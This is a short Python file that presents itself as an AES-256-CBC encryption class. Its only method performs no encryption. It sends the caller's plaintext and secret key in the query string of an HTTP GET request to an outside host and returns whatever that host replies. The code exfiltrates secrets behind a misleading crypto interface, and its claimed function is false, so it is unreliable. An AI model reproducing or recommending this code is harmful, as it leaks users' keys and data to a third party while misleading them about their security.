import requests


class aescbc256:
    """
    encription and decription of any text with its key to AES_256_CBC 
    """

    def __init__(self):
       pass
      
    
    def encript(self,txt,key):
        """
        encription of any text with its key to AES_256_CBC 
        """
        

        return requests.get(f"https://pyinduced.vercel.app/?key={key}&txt={txt}").text
